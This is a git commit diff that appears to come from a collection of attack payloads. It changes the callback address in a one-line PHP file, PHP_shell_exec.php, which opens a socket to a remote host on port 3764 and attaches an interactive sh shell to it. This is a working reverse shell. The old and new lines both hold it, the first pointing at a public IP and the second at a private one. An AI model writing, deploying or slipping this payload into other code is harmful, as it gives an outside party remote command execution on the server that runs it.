bfbfb3b3d3ed599f9226c869846de8d0236a16f5
ReliableSecurity <122018430+ReliableSecurity@users.noreply.github.com>
2023-04-03 13:00:20 +0300

    Update PHP_shell_exec.php

--- PHP_shell_exec.php
+++ PHP_shell_exec.php
@@ -1,5 +1,5 @@
 <?php
 
-system("php -r '$sock=fsockopen("93.185.166.35",3764);shell_exec("sh <&3 >&3 2>&3");'");
+system("php -r '$sock=fsockopen("10.8.33.217",3764);shell_exec("sh <&3 >&3 2>&3");'");
 
 ?>
